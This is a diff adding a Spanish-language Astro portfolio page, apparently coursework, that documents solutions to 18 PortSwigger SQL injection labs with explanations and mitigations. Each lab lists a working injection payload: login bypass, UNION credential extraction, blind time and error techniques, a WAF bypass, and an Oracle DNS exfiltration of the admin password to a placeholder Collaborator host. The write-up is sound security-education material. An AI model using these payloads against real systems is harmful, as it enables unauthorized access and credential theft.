@@ -1,0 +1,513 @@
+---
+// Importamos el Layout
+import Layout from "../../layouts/Layout.astro"
+
+// Importamos los componentes
+import SectionContainer from "../../components/SectionContainer.astro"
+import TitleSection from "../../components/TitleSection.astro"
+import CodeIcon from "../../components/Icons/Code.astro"
+import Link from "../../components/Icons/Link.astro"
+
+// --- DATOS DE LA TAREA ---
+const INFO_TAREA = {
+  titulo: "Actividad 08: Road to Hall of Fame (SQL Injection)",
+  fecha: "06 de Marzo, 2026",
+  descripcion: "Portafolio técnico-profesional que documenta la explotación sistemática de vulnerabilidades de SQL Injection en los laboratorios oficiales de PortSwigger, aplicando Burp Suite como herramienta principal.",
+  pdf: "/pdfs/Act08-Equipo5.pdf", 
+}
+
+// --- DATOS DE LOS LABORATORIOS (Generación Dinámica) ---
+const LABS = [
+  {
+    id: 1,
+    nombre: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
+    nivel: "Apprentice",
+    tipo: "In-band SQL Injection (Manipulación de WHERE)",
+    objetivo: "Explotar la vulnerabilidad en el filtro de categorías para mostrar todos los productos, incluyendo los ocultos (released = 0).",
+    explicacion: "La aplicación filtra productos mediante la categoría y el flag released=1. Al inyectar una condición OR 1=1, que siempre es verdadera, la condición released=1 se cortocircuita y el motor devuelve todos los registros sin importar su estado. El comentario -- descarta el resto de la consulta original.",
+    payload: "' OR 1=1 --",
+    pasos: [
+      "Identificar el parámetro vulnerable en la URL: /filter?category=Gifts.",
+      "Modificar la URL inyectando el payload en el valor del parámetro.",
+      "Verificar que la respuesta incluye todos los productos (incluyendo los no publicados)."
+    ],
+    mitigacion: "Usar Prepared Statements / Consultas parametrizadas. Nunca concatenar inputs del usuario directamente en la consulta SQL.",
+    imagen: "/projects/lab1.png"
+  },
+  {
+    id: 2,
+    nombre: "SQL injection vulnerability allowing login bypass",
+    nivel: "Apprentice",
+    tipo: "In-band SQL Injection (Bypass de Autenticación)",
+    objetivo: "Iniciar sesión como el usuario 'administrator' sin conocer su contraseña.",
+    explicacion: "El formulario de login concatena directamente la entrada del usuario en la consulta SQL. Al inyectar administrator'--, el comentario -- hace que la condición AND password='...' sea ignorada por completo. La base de datos encuentra el registro del administrador y la autenticación es exitosa.",
+    payload: "administrator'--",
+    pasos: [
+      "Abrir el formulario de login.",
+      "Ingresar como usuario el payload y cualquier valor en el campo de contraseña.",
+      "Enviar el formulario — se inicia sesión como administrator."
+    ],
+    mitigacion: "Implementar Prepared Statements. Aplicar hashing seguro de contraseñas (bcrypt, Argon2). Limitar intentos de login con rate limiting y captcha.",
+    imagen: "/projects/lab2.png"
+  },
+  {
+    id: 3,
+    nombre: "SQL injection attack, querying the database type and version on Oracle",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection",
+    objetivo: "Utilizar un UNION attack para extraer la versión del motor Oracle.",
+    explicacion: "En Oracle, toda consulta SELECT debe ir acompañada de una cláusula FROM. La tabla DUAL es una tabla especial de una sola fila y columna diseñada exactamente para este tipo de consultas de sistema. La vista v$version contiene la versión del motor. El número de columnas en el UNION debe coincidir con la consulta original.",
+    payload: "' UNION SELECT BANNER, NULL FROM v$version--",
+    pasos: [
+      "Determinar el número de columnas con ORDER BY 1--, ORDER BY 2--, ORDER BY 3-- hasta obtener error.",
+      "Verificar que las columnas admiten texto usando: ' UNION SELECT NULL, NULL FROM dual--.",
+      "Inyectar la consulta final apuntando a la vista v$version.",
+      "Visualizar la versión de Oracle en el frontend de la página."
+    ],
+    mitigacion: "Consultas parametrizadas. Restringir permisos SELECT sobre vistas del sistema (v$version, v$instance) al usuario de aplicación.",
+    imagen: "/projects/lab3.png"
+  },
+  {
+    id: 4,
+    nombre: "SQL injection attack, querying the database type and version on MySQL and Microsoft",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection",
+    objetivo: "Obtener la versión del motor de base de datos (MySQL o MSSQL).",
+    explicacion: "MySQL y MSSQL exponen la versión del servidor mediante la variable global @@version. A diferencia de Oracle, estas bases de datos no requieren FROM en consultas simples. En MySQL el carácter de comentario es # o -- (con espacio). En MSSQL se usa --.",
+    payload: "' UNION SELECT @@version, NULL#",
+    pasos: [
+      "Detectar el número de columnas con ORDER BY.",
+      "Identificar columnas que admiten texto.",
+      "Inyectar @@version en la posición correcta.",
+      "Confirmar la resolución al visualizar la versión del servidor."
+    ],
+    mitigacion: "Consultas preparadas. Limitar permisos del usuario de BD para no poder leer variables globales del sistema.",
+    imagen: "/projects/lab4.png"
+  },
+  {
+    id: 5,
+    nombre: "SQL injection attack, listing the database contents on non-Oracle databases",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection (information_schema)",
+    objetivo: "Enumerar tablas y columnas usando information_schema para encontrar la tabla de usuarios y extraer la contraseña del administrador.",
+    explicacion: "El esquema information_schema es un estándar SQL disponible en PostgreSQL, MySQL y MSSQL. Contiene metadatos de todas las tablas y columnas de la base de datos. Al consultar information_schema.tables se obtiene la lista de tablas; luego information_schema.columns revela las columnas de la tabla objetivo.",
+    payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
+    pasos: [
+      "Listar tablas: ' UNION SELECT table_name, NULL FROM information_schema.tables--.",
+      "Identificar la tabla de usuarios (nombre dinámico como users_xkzpq).",
+      "Listar columnas: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xkzpq'--.",
+      "Extraer credenciales: ' UNION SELECT username_col, password_col FROM users_xkzpq--."
+    ],
+    mitigacion: "Prepared Statements. Restringir SELECT sobre information_schema al usuario de aplicación.",
+    imagen: "/projects/lab5.png"
+  },
+  {
+    id: 6,
+    nombre: "SQL injection attack, listing the database contents on Oracle",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection (Diccionario Oracle)",
+    objetivo: "Enumerar una base de datos Oracle para extraer credenciales del administrador usando las vistas del diccionario de datos.",
+    explicacion: "Oracle no implementa el estándar information_schema. En su lugar usa sus propias vistas del diccionario de datos: all_tables (tablas accesibles por el usuario actual) y all_tab_columns (columnas de esas tablas). Todas las consultas SELECT en Oracle requieren FROM. Los nombres de tablas suelen estar en MAYÚSCULAS.",
+    payload: "' UNION SELECT table_name, NULL FROM all_tables--",
+    pasos: [
+      "Listar tablas: ' UNION SELECT table_name, NULL FROM all_tables--.",
+      "Identificar la tabla de usuarios.",
+      "Listar columnas: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XYZ'--.",
+      "Extraer datos: ' UNION SELECT username, password FROM USERS_XYZ--."
+    ],
+    mitigacion: "Prepared Statements. Restringir permisos SELECT sobre all_tables y all_tab_columns al usuario de aplicación.",
+    imagen: "/projects/lab6.png"
+  },
+  {
+    id: 7,
+    nombre: "SQL injection UNION attack, determining the number of columns returned by the query",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection (Reconocimiento)",
+    objetivo: "Determinar el número exacto de columnas que devuelve la consulta original usando NULL progresivos.",
+    explicacion: "Una cláusula UNION requiere que ambas consultas devuelvan el mismo número de columnas. Si el número no coincide, el motor lanza un error HTTP 500. La técnica consiste en agregar NULL progresivamente hasta que la respuesta sea 200 OK. NULL es compatible con cualquier tipo de dato, lo que lo hace ideal para descubrir el conteo.",
+    payload: "' UNION SELECT NULL, NULL, NULL--",
+    pasos: [
+      "Enviar: ' UNION SELECT NULL-- → 500 error.",
+      "Enviar: ' UNION SELECT NULL, NULL-- → 500 error.",
+      "Enviar: ' UNION SELECT NULL, NULL, NULL-- → 200 OK (3 columnas confirmadas).",
+      "Alternativamente usar ORDER BY 1--, ORDER BY 2--, ... hasta obtener error."
+    ],
+    mitigacion: "Prepared Statements. Implementar manejo genérico de errores SQL sin revelar detalles de la consulta.",
+    imagen: "/projects/lab7.png"
+  },
+  {
+    id: 8,
+    nombre: "SQL injection UNION attack, finding a column containing text",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection (Detección de tipo de dato)",
+    objetivo: "Identificar qué columna admite datos de tipo texto (string) para poder exfiltrar información.",
+    explicacion: "Una vez conocido el número de columnas, se debe encontrar cuál acepta tipo texto. Si se inyecta una cadena en una columna que espera un entero, el motor arroja error de conversión de tipos. Se sustituye un NULL por una cadena de prueba ('a') de forma iterativa hasta encontrar la columna compatible.",
+    payload: "' UNION SELECT NULL, 'XQzmzj', NULL--",
+    pasos: [
+      "Probar columna 1: ' UNION SELECT 'a', NULL, NULL-- → si da error, no es texto.",
+      "Probar columna 2: ' UNION SELECT NULL, 'a', NULL-- → si carga, es texto.",
+      "Una vez hallada, usar el valor de texto específico que solicita el laboratorio.",
+      "Confirmar que el texto inyectado aparece reflejado en la respuesta HTTP."
+    ],
+    mitigacion: "Consultas parametrizadas que separan el tipo de dato esperado del valor de entrada.",
+    imagen: "/projects/lab8.png"
+  },
+  {
+    id: 9,
+    nombre: "SQL injection UNION attack, retrieving data from other tables",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection (Exfiltración directa)",
+    objetivo: "Recuperar usernames y contraseñas de la tabla 'users' usando UNION SELECT.",
+    explicacion: "Este lab integra los conocimientos de los labs 7 y 8. Sabiendo que la consulta devuelve 2 columnas de tipo texto, se puede seleccionar directamente las columnas username y password desde la tabla users. La respuesta de la aplicación mostrará las credenciales mezcladas con los productos.",
+    payload: "' UNION SELECT username, password FROM users--",
+    pasos: [
+      "Confirmar 2 columnas de tipo texto (labs previos).",
+      "Inyectar el UNION SELECT apuntando a la tabla users.",
+      "Las credenciales aparecen directamente en la página.",
+      "Usar la contraseña obtenida para hacer login como administrator."
+    ],
+    mitigacion: "Prepared Statements. Hashear contraseñas con algoritmos seguros (bcrypt, Argon2). Implementar el principio de mínimo privilegio en la cuenta de BD.",
+    imagen: "/projects/lab9.png"
+  },
+  {
+    id: 10,
+    nombre: "SQL injection UNION attack, retrieving multiple values in a single column",
+    nivel: "Practitioner",
+    tipo: "UNION-based SQL Injection (Concatenación)",
+    objetivo: "Exfiltrar username y password cuando solo una columna acepta texto, usando concatenación de cadenas.",
+    explicacion: "Cuando solo una columna acepta texto, no es posible extraer dos campos por separado. La solución es concatenar los valores en una sola cadena usando el operador del motor: || en PostgreSQL/Oracle, + en MSSQL, CONCAT() en MySQL. Se añade un delimitador personalizado (~) para separar los valores en el output.",
+    payload: "' UNION SELECT NULL, username || '~' || password FROM users--",
+    pasos: [
+      "Identificar que solo la segunda columna acepta texto: ' UNION SELECT NULL, 'a'--.",
+      "Concatenar ambos campos con un delimitador: ' UNION SELECT NULL, username || '~' || password FROM users--.",
+      "Parsear la respuesta buscando el separador ~.",
+      "Usar la contraseña del administrator para iniciar sesión."
+    ],
+    mitigacion: "Prepared Statements. Política de contraseñas fuertes y hashing seguro.",
+    imagen: "/projects/lab10.png"
+  },
+  {
+    id: 11,
+    nombre: "Blind SQL injection with conditional responses",
+    nivel: "Practitioner",
+    tipo: "Blind SQLi (Boolean-based)",
+    objetivo: "Inferir carácter por carácter la contraseña del administrador evaluando si aparece 'Welcome back' en la respuesta.",
+    explicacion: "La vulnerabilidad está en la cookie TrackingId. La aplicación no devuelve datos de la consulta, pero muestra 'Welcome back' si la condición es verdadera. Se usa SUBSTRING para extraer un carácter de la contraseña y compararlo con un valor candidato. Si coincide → Welcome back (TRUE). Si no → sin mensaje (FALSE).",
+    payload: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--",
+    pasos: [
+      "Confirmar la inyección: ' AND '1'='1 → Welcome back / ' AND '1'='2 → sin mensaje.",
+      "Confirmar que existe el usuario administrator en la tabla users.",
+      "Determinar longitud del password: ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>19--.",
+      "Extraer carácter a carácter con Burp Intruder (modo Cluster Bomb), filtrando por presencia de 'Welcome back'."
+    ],
+    mitigacion: "Prepared Statements. Parametrizar también los valores de cookies y cabeceras HTTP.",
+    imagen: "/projects/lab11.png"
+  },
+  {
+    id: 12,
+    nombre: "Blind SQL injection with conditional errors",
+    nivel: "Practitioner",
+    tipo: "Blind SQLi (Error-based condicional)",
+    objetivo: "Extraer la contraseña provocando errores matemáticos condicionales (división por cero) en Oracle, usando el código HTTP como oráculo.",
+    explicacion: "No hay indicador visual en la respuesta HTML. El canal de extracción es el código HTTP: 500 = condición verdadera (error forzado) / 200 = condición falsa (sin error). Se usa CASE WHEN para evaluar cada carácter: si es correcto, ejecuta 1/0 que lanza ORA-01476, generando HTTP 500. Si es incorrecto, devuelve '' sin error, generando HTTP 200.",
+    payload: "' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '",
+    pasos: [
+      "Confirmar el motor Oracle: inyectar ' || (SELECT '' FROM dual) || ' → 200 OK.",
+      "Test básico de error: ' || (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' → 500.",
+      "Confirmar que existe el usuario administrator con COUNT(*).",
+      "Extraer contraseña carácter a carácter con Burp Intruder evaluando códigos HTTP 500 vs 200."
+    ],
+    mitigacion: "Prepared Statements. Deshabilitar mensajes de error detallados. No usar datos de usuario en consultas sin parametrizar.",
+    imagen: "/projects/lab12.png"
+  },
+  {
+    id: 13,
+    nombre: "Visible error-based SQL injection",
+    nivel: "Practitioner",
+    tipo: "Error-Based SQL Injection",
+    objetivo: "Extraer la contraseña del administrador forzando que aparezca literalmente en el mensaje de error de PostgreSQL.",
+    explicacion: "PostgreSQL lanza un error detallado cuando intenta convertir un tipo incompatible. Al forzar CAST(texto AS integer), si el texto no puede convertirse, PostgreSQL incluye el valor del texto en el mensaje de error: 'ERROR: invalid input syntax for type integer: contraseña_aquí'. La aplicación muestra este error, revelando el valor directamente.",
+    payload: "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
+    pasos: [
+      "Confirmar error visible: ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- → error con el username.",
+      "Si el error dice 'more than one row', agregar LIMIT 1.",
+      "Cambiar username por password para extraer la contraseña.",
+      "Leer la contraseña directamente del mensaje de error en la respuesta HTTP."
+    ],
+    mitigacion: "Deshabilitar display de errores de BD en producción (mostrar solo errores genéricos). Usar try/catch con logs internos. Prepared Statements.",
+    imagen: "/projects/lab13.png"
+  },
+  {
+    id: 14,
+    nombre: "Blind SQL injection with time delays",
+    nivel: "Practitioner",
+    tipo: "Blind SQLi (Time-based)",
+    objetivo: "Confirmar la existencia de la vulnerabilidad forzando un retraso de 10 segundos en la respuesta del servidor.",
+    explicacion: "Cuando no hay diferencia visual ni en el código HTTP, el canal de confirmación es el tiempo de respuesta (latencia). Si la función pg_sleep se ejecuta, el servidor tardará exactamente el tiempo especificado. Al concatenar pg_sleep(10) de PostgreSQL en la cookie TrackingId, se confirma la vulnerabilidad midiendo la latencia.",
+    payload: "'|| pg_sleep(10)--",
+    pasos: [
+      "Interceptar la petición con Burp Suite y ubicar la cookie TrackingId.",
+      "Enviar la petición con el payload e iniciar el cronómetro.",
+      "Si el servidor responde después de ~10 segundos, la inyección está confirmada.",
+      "Revisar la columna 'Response Time' en Burp Repeater (salto de ~170ms a ~10,000ms)."
+    ],
+    mitigacion: "Prepared Statements. Revocar permisos de ejecución de pg_sleep al usuario de aplicación de BD.",
+    imagen: "/projects/lab14.png"
+  },
+  {
+    id: 15,
+    nombre: "Blind SQL injection with time delays and information retrieval",
+    nivel: "Practitioner",
+    tipo: "Blind SQLi (Time-based Data Extraction)",
+    objetivo: "Extraer la contraseña del administrador carácter por carácter midiendo tiempos de respuesta.",
+    explicacion: "Se combina el time-delay con un CASE WHEN condicional. Si el carácter evaluado es correcto, ejecuta pg_sleep(5) y la respuesta tarda 5+ segundos. Si es incorrecto, ejecuta pg_sleep(0) y responde de inmediato. El punto y coma (;) permite stacked queries en PostgreSQL, añadiendo una segunda consulta independiente.",
+    payload: "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--",
+    pasos: [
+      "Confirmar inyección con el lab anterior (time-delay simple).",
+      "Calcular la longitud de la contraseña usando LENGTH(password)>N con delays.",
+      "Configurar Burp Intruder (Cluster Bomb) para iterar la posición y el carácter alfanumérico.",
+      "Filtrar las respuestas con delay de >4500ms para reconstruir la contraseña completa."
+    ],
+    mitigacion: "Prepared Statements. Deshabilitar Stacked Queries en la configuración del driver de BD cuando no sean necesarias.",
+    imagen: "/projects/lab15.png"
+  },
+  {
+    id: 16,
+    nombre: "Blind SQL injection with out-of-band interaction",
+    nivel: "Practitioner",
+    tipo: "Blind SQLi (OOB via DNS Lookup)",
+    objetivo: "Forzar una resolución DNS saliente hacia Burp Collaborator para confirmar la inyección sin canal HTTP.",
+    explicacion: "Cuando no hay diferencia en respuesta HTTP ni en tiempo, el único canal disponible es la red saliente (OOB). Oracle permite realizar peticiones mediante EXTRACTVALUE con entidades XML externas (XXE incrustado en SQL). Al procesar el XML malicioso, Oracle intenta resolver el hostname remoto, generando una consulta DNS visible en Burp Collaborator.",
+    payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l')+FROM+dual--",
+    pasos: [
+      "Obtener un subdominio válido desde Burp Collaborator Client.",
+      "Inyectar el payload con el subdominio del Collaborator en la cookie TrackingId.",
+      "Enviar la petición modificada.",
+      "Verificar en el panel del Collaborator que se recibió una petición DNS/HTTP desde el servidor Oracle."
+    ],
+    mitigacion: "Egress Filtering: bloquear todo tráfico saliente no autorizado desde el servidor de BD. Aplicar whitelist de destinos de red para el proceso de Oracle.",
+    imagen: "/projects/lab16.png"
+  },
+  {
+    id: 17,
+    nombre: "Blind SQL injection with out-of-band data exfiltration",
+    nivel: "Practitioner",
+    tipo: "Blind SQLi (OOB Data Exfiltration)",
+    objetivo: "Exfiltrar la contraseña del administrador enviándola embebida en una consulta DNS hacia Burp Collaborator.",
+    explicacion: "Similar al lab anterior, pero la subconsulta que extrae la contraseña se concatena directamente al subdominio de la URL del Collaborator. Al resolverse el DNS, el registro que llega contiene la contraseña como subdominio: contraseña.tu-collaborator.net. Oracle evalúa la subconsulta antes de construir la URL, por lo que la resolución DNS lleva el dato embebido.",
+    payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.[COLLABORATOR]/\"> %remote;]>'),'/l')+FROM+dual--",
+    pasos: [
+      "Abrir Burp Collaborator y copiar el subdominio asignado.",
+      "Inyectar el payload con la subconsulta de password concatenada al subdominio.",
+      "Enviar la petición.",
+      "Revisar en Collaborator el DNS lookup recibido — el subdominio de primer nivel es la contraseña del administrador."
+    ],
+    mitigacion: "Egress Filtering estricto. DNS Filtering para bloquear resoluciones a dominios no autorizados. Monitoreo de tráfico DNS saliente inusual.",
+    imagen: "/projects/lab17.png"
+  },
+  {
+    id: 18,
+    nombre: "SQL injection with filter bypass via XML encoding",
+    nivel: "Practitioner",
+    tipo: "In-band SQLi (WAF Bypass)",
+    objetivo: "Evadir el Web Application Firewall (WAF) codificando el payload SQL en entidades hexadecimales XML para extraer credenciales.",
+    explicacion: "La aplicación envía datos en formato XML y el WAF inspecciona el contenido buscando palabras clave SQL (UNION, SELECT, etc.). Sin embargo, el WAF no normaliza las entidades XML antes de inspeccionar. El atacante usa codificación hexadecimal XML (&#xHH;) para ofuscar el payload. El backend XML parser decodifica las entidades antes de pasarlas al motor SQL, ejecutando la inyección exitosamente.",
+    payload: "<@hex_entities>1 UNION SELECT username || '-' || password FROM users</@hex_entities>",
+    pasos: [
+      "Interceptar la petición de la función Stock Check (formato XML) con Burp Suite.",
+      "Confirmar que el WAF bloquea: 1 UNION SELECT NULL → 403 Forbidden.",
+      "Usar la extensión Hackvertor en Burp Suite para envolver el payload en la etiqueta <@hex_entities>.",
+      "Enviar la petición con el payload codificado → 200 OK con las credenciales concatenadas."
+    ],
+    mitigacion: "Configurar el WAF para normalizar y decodificar TODAS las formas de encoding (URL, HTML, XML, hex) ANTES de aplicar las reglas de inspección. Usar Prepared Statements como capa de defensa adicional.",
+    imagen: "/projects/lab18.png"
+  }
+];
+---
+
+<Layout
+  title={`Portafolio - ${INFO_TAREA.titulo}`}
+  description={INFO_TAREA.descripcion}
+>
+  <style>
+    :global(header) {
+      display: none !important;
+    }
+  </style>
+
+  <main class="px-4">
+    <SectionContainer class="py-16 md:py-20">
+      
+      {/* --- ENCABEZADO --- */}
+      <TitleSection>
+        <CodeIcon class="size-8" />
+        {INFO_TAREA.titulo}
+      </TitleSection>
+      
+      <p class="text-sm text-gray-500 dark:text-gray-400 mb-8 -mt-4 border-b border-gray-200 dark:border-gray-800 pb-4">
+        📅 Entregado el: {INFO_TAREA.fecha}
+      </p>
+
+      {/* --- CONTENIDO PRINCIPAL --- */}
+      <div class="prose dark:prose-invert max-w-none text-gray-800 dark:text-gray-200 space-y-12">
+        
+        {/* --- MARCO TEÓRICO --- */}
+        <div>
+            <h3 class="text-3xl font-bold mb-4 text-blue-500/90 border-b border-blue-500/20 pb-2">1. Marco Teórico y Fundamentación</h3>
+            
+            <h4 class="text-xl font-semibold mt-4 text-gray-900 dark:text-white">Fundamentos y ¿Qué es SQL Injection?</h4>
+            <p class="text-justify">
+            Las bases de datos relacionales estructuran la información en tablas (filas y columnas) y son gestionadas mediante SQL (Structured Query Language). Una vulnerabilidad de <strong>SQL Injection (SQLi)</strong> ocurre cuando una aplicación web inserta datos proporcionados por el usuario directamente en una consulta SQL sin la debida sanitización o parametrización. Esto permite a un atacante alterar la lógica de ejecución del backend, pudiendo leer, modificar o destruir información sensible.
+            </p>
+
+            <h4 class="text-xl font-semibold mt-4 text-gray-900 dark:text-white">Clasificación de Ataques SQLi</h4>
+            <ul class="list-disc list-inside space-y-1 text-justify">
+                <li><strong>In-band (Clásico):</strong> El atacante utiliza el mismo canal de comunicación para lanzar el ataque y recolectar los resultados. Incluye técnicas <em>Error-based</em> y <em>UNION-based</em>.</li>
+                <li><strong>Blind (Ciego):</strong> La aplicación no devuelve datos de la base de datos en la pantalla. La extracción de información se realiza mediante inferencia, analizando respuestas condicionales (Boolean-based) o provocando pausas en el servidor (Time-based).</li>
+                <li><strong>Out-of-band (OOB):</strong> Se utiliza cuando la respuesta es asíncrona. El atacante obliga a la base de datos a generar una conexión de red externa (ej. DNS o HTTP) hacia un servidor que él controla para exfiltrar los datos.</li>
+            </ul>
+
+            <h4 class="text-xl font-semibold mt-4 text-gray-900 dark:text-white">Impacto (Triada CIA) y Prevención (OWASP)</h4>
+            <p class="text-justify">
+            Catalogado habitualmente en el <strong>Top 3 del OWASP Top 10 (A03:2021-Injection)</strong>, el SQLi tiene un impacto catastrófico en la seguridad corporativa. Compromete la <em>Confidencialidad</em> al exponer contraseñas y datos personales; destruye la <em>Integridad</em> al permitir la modificación o eliminación de registros; y vulnera la <em>Disponibilidad</em> al permitir la denegación de servicio (DoS) o borrado de tablas. Su prevención principal radica en la implementación arquitectónica de <strong>Prepared Statements (Consultas Parametrizadas)</strong> y validación estricta de inputs (Whitelisting).
+            </p>
+        </div>
+
+        {/* --- DESARROLLO PRÁCTICO (MAPEADO DINÁMICO DE LABORATORIOS) --- */}
+        <div>
+            <h3 class="text-3xl font-bold mb-6 text-blue-500/90 border-b border-blue-500/20 pb-2">2. Desarrollo Técnico: Laboratorios PortSwigger</h3>
+            
+            <div class="space-y-16">
+              {LABS.map((lab, index) => (
+                <div class="bg-gray-50 dark:bg-[#0f111a] border border-gray-200 dark:border-gray-800 rounded-2xl p-6 shadow-sm">
+                  
+                  {/* Header del Laboratorio */}
+                  <div class="mb-6">
+                    <div class="flex flex-wrap items-center gap-3 mb-2">
+                        <span class="bg-blue-600 text-white text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider">LAB {index + 1}</span>
+                        <span class={`text-xs font-bold px-3 py-1 rounded-full ${lab.nivel === 'Apprentice' ? 'bg-green-100 text-green-800 dark:bg-green-900/40 dark:text-green-400' : 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900/40 dark:text-yellow-400'}`}>
+                            {lab.nivel}
+                        </span>
+                        <span class="bg-gray-200 text-gray-800 dark:bg-gray-800 dark:text-gray-300 text-xs font-bold px-3 py-1 rounded-full">
+                            {lab.tipo}
+                        </span>
+                    </div>
+                    <h4 class="text-xl md:text-2xl font-bold text-gray-900 dark:text-white leading-tight">
+                        {lab.nombre}
+                    </h4>
+                  </div>
+
+                  {/* Explicación Técnica y Objetivo */}
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                      <div>
+                          <h5 class="text-blue-500 font-semibold mb-2 flex items-center gap-2">
+                              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                              Objetivo del Laboratorio
+                          </h5>
+                          <p class="text-sm text-gray-700 dark:text-gray-300 text-justify">{lab.objetivo}</p>
+                      </div>
+                      <div>
+                          <h5 class="text-blue-500 font-semibold mb-2 flex items-center gap-2">
+                              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
+                              Análisis de Vulnerabilidad
+                          </h5>
+                          <p class="text-sm text-gray-700 dark:text-gray-300 text-justify">{lab.explicacion}</p>
+                      </div>
+                  </div>
+
+                  {/* Pasos y Terminal (Payload) */}
+                  <div class="mb-6">
+                      <h5 class="text-blue-500 font-semibold mb-3 flex items-center gap-2">
+                          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                          Procedimiento Metodológico
+                      </h5>
+                      <ul class="list-decimal list-inside space-y-1 mb-4 text-sm text-gray-700 dark:text-gray-300">
+                          {lab.pasos.map(paso => (
+                              <li>{paso}</li>
+                          ))}
+                      </ul>
+
+                      {/* Caja de Terminal para Payload */}
+                      <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-md overflow-hidden border border-gray-700 mt-4">
+                          <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+                              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                              <span class="ml-2 text-xs text-gray-400 font-mono">Payload inyectado</span>
+                          </div>
+                          <div class="p-4 overflow-x-auto text-sm">
+                              <pre class="font-mono text-green-400 leading-relaxed whitespace-pre-wrap break-words">{lab.payload}</pre>
+                          </div>
+                      </div>
+                  </div>
+
+                  {/* Evidencia Fotográfica */}
+                  <div class="mb-6">
+                      <h5 class="text-blue-500 font-semibold mb-3 flex items-center gap-2">
+                          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                          Evidencia Técnica (Burp Suite / Resolución)
+                      </h5>
+                      <figure class="relative transition-all duration-300 hover:scale-[1.01] bg-white dark:bg-[#1a1e29] p-2 rounded-xl">
+                          <img 
+                              class="w-full rounded-lg shadow-sm border border-gray-200 dark:border-gray-800 object-contain" 
+                              src={lab.imagen} 
+                              alt={`Captura del ${lab.nombre}`} 
+                          />
+                      </figure>
+                  </div>
+
+                  {/* Mitigación */}
+                  <div class="bg-blue-50 dark:bg-blue-900/10 border-l-4 border-blue-500 p-4 rounded-r-lg">
+                      <h5 class="text-blue-600 dark:text-blue-400 font-bold mb-1 text-sm flex items-center gap-2">
+                          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                          Estrategia de Mitigación Recomendada
+                      </h5>
+                      <p class="text-sm text-gray-700 dark:text-gray-300 text-justify">{lab.mitigacion}</p>
+                  </div>
+
+                </div>
+              ))}
+            </div>
+        </div>
+
+        {/* --- CONCLUSIONES --- */}
+        <div>
+            <h3 class="text-3xl font-bold mb-4 text-blue-500/90 border-b border-blue-500/20 pb-2">3. Conclusiones</h3>
+            <p class="text-justify">
